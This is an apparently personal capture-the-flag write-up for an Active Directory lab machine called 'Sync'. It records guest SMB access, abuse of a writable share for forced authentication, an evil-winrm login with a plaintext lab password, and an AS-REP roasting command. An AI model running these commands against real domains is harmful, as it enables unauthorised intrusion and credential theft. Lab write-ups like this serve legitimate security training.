---
tags: [AD, Challenge]
title: Sync
created: '2020-07-07T17:53:55.480Z'
modified: '2020-10-02T17:42:03.060Z'
---

# Sync
- IP: `172.31.3.6`
- OS: `Active Directory`
## Enumeration
### Writeup
We have guest login on smb: `smbclient.py SYNC\asdfsf@172.31.3.6`
We mount the Department share but there's nothing there: `mount -t cifs -o username=user,password= //172.31.3.6/Department /mnt/Department/`

However, we have write permissions but can't write? We check permissions with `smbcacls -N '//172.31.3.6/Department' 'Support'`
We can only write in the support directory!
We exploit: `https://ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-url`

We get access: `evil-winrm -i 172.31.3.6 -u sysadmin -p sEsshOUmArU25-159`

`GetNPUsers.py sync.csl/sysadmin:sEsshOUmArU25-159 -dc-ip 172.31.3.6 -request -format hashcat -outputfile hashes.asreproas`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.3.6`
```

```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
